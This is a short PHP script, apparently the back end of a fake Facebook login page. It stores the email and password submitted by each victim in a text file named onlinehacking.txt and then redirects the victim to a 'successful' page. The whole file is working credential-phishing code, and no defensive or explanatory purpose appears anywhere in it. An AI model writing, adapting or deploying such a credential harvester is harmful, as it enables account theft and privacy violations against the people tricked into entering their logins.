<?php 
file_put_contents("../onlinehacking.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: successful.html');
exit();
?>
